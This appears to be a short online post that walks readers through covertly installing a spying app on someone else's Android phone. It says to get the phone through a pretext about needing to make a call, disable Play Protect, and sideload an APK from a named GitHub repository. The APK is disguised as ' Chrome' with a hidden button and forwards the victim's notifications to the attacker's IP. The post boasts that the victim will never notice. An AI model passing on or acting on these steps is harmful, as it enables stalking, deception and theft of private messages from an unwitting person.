Suppose you want to spy on someone who is connected to same wifi network/router. You can take their phone by telling them your sim balance is finished and you need to make a call. After taking the phone, here is what you have to do:

-Turn Play Protect off in the Play Store.

-Go to my GitHub link: github.com/Farhan1151/spynoti

-Download the SpyNoti APK.

-Install it.

-Go to Settings > Apps > search for " Chrome" (with a space) > allow restricted settings, grant all permissions, untick "manage app if unused," and allow it from background autostart (for Xiaomi phones).

-Go to Chrome, and tap on the bottom right corner where you will find a hidden button.

-Put your IP in and hit "Test Connection."

You only need 1-2 minutes to do this.There is notification receiver.apk in GitHub which will show you the notifications when you tap on "Start Server".Install it on your phone.

I named the app " Chrome" (with an extra space at the beginning). If you open it, it looks almost identical to the actual Chrome app. The button is black, making it nearly invisible on the phone's screen. The user will never know that you have two Chrome apps installed on your phone.
